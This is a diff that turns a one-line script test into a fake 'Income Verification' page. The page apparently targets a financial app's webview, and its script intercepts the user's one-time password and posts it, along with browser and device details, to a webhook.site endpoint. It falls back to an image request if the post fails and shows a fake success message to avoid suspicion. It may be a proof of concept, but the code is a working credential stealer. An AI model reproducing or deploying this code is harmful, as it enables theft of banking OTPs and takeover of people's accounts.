@@ -1,1 +1,79 @@
-<script>alert(1)</script>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Income Verification</title>
+    <style>
+        body { font-family: Arial; padding: 20px; }
+        .loading { text-align: center; margin: 50px; }
+    </style>
+</head>
+<body>
+    <div class="loading">
+        <h2>🏦 Verifying Your Income...</h2>
+        <p>Please wait while we verify your bank account details.</p>
+        <p><em>An OTP will be sent to your registered mobile number.</em></p>
+    </div>
+
+<script>
+// 🚨 CRITICAL: OTP Interception Function
+window.postOTP = function(otp) {
+    console.log("🎯 INTERCEPTED OTP:", otp);
+    
+    // Immediately exfiltrate the OTP
+    fetch('https://webhook.site/fbdb0ab2-a110-4279-b4f0-be2da7cb6332', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            otp: otp,
+            timestamp: Date.now(),
+            userAgent: navigator.userAgent,
+            url: window.location.href,
+            source: 'groww_app_webview'
+        })
+    }).then(() => {
+        console.log("OTP successfully exfiltrated");
+    }).catch(e => {
+        console.error("Exfiltration failed:", e);
+        
+        // Fallback: Try to send via image request
+        const img = new Image();
+        img.src = `https://webhook.site/fbdb0ab2-a110-4279-b4f0-be2da7cb6332/otp-img?code=${otp}&t=${Date.now()}`;
+    });
+    
+    // Show fake success message to avoid suspicion
+    document.body.innerHTML = `
+        <div style="text-align: center; margin: 50px;">
+            <h2>✅ Verification Complete</h2>
+            <p>Your income has been successfully verified.</p>
+            <p>OTP: <strong>${otp}</strong> received and processed.</p>
+        </div>
+    `;
+};
+
+// Additional data collection
+setTimeout(() => {
+    // Collect device/app information
+    const deviceInfo = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        cookieEnabled: navigator.cookieEnabled,
+        onLine: navigator.onLine,
+        url: window.location.href,
+        referrer: document.referrer,
+        timestamp: Date.now()
+    };
+    
+    // Send device fingerprint
+    fetch('https://webhook.site/fbdb0ab2-a110-4279-b4f0-be2da7cb6332/device-info', {
+        method: 'POST',
+        body: JSON.stringify(deviceInfo)
+    });
+}, 2000);
+
+console.log("🚨 OTP Stealer loaded and ready!");
+</script>
+</body>
+</html>
